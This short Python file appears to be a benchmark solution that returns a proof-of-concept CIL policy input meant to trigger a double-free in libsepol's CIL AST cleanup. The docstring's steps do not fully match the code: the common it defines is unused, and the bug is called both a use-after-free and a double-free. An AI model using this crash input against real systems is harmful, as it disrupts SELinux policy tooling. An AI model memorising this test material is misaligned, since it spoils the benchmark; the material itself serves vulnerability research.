import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a heap use-after-free vulnerability in libsepol/cil.

        The vulnerability is a double-free that occurs during CIL AST destruction.
        It is triggered when an anonymous `classpermission` is passed as an argument
        to a macro, and that macro uses the argument to define a `classpermissionset`.
        The `classpermissionset` rule doesn't correctly handle the anonymous nature of
        the `classpermission`, leading to the same object being referenced for destruction
        twice: once as an anonymous object and once as part of the `classpermissionset`.

        This PoC constructs a minimal CIL policy to create this exact scenario:
        1. Define a common permission `p` and a class `c` that uses it. This is
           necessary for a valid `classpermission` definition.
        2. Define a macro `m` that takes a `classpermission` argument `a`.
        3. Inside the macro, define a `classpermissionset` `s` that contains the
           argument `a`.
        4. Call the macro `m` with an anonymous `classpermission` `(classpermission c(p))`
           as the argument.

        This setup creates the vulnerable AST structure, which crashes the program
        with a double-free error during the cleanup phase. The PoC is minified
        by using single-letter identifiers and removing all non-essential whitespace.

        Args:
            src_path: Path to the vulnerable source code tarball (not used in this solution).

        Returns:
            bytes: The PoC input that triggers the vulnerability.
        """
        poc = (
            b"(class c(p))"
            b"(common o(p))"
            b"(macro m((classpermission a))(classpermissionset s(a)))"
            b"(call m((classpermission c(p))))"
        )
        return poc
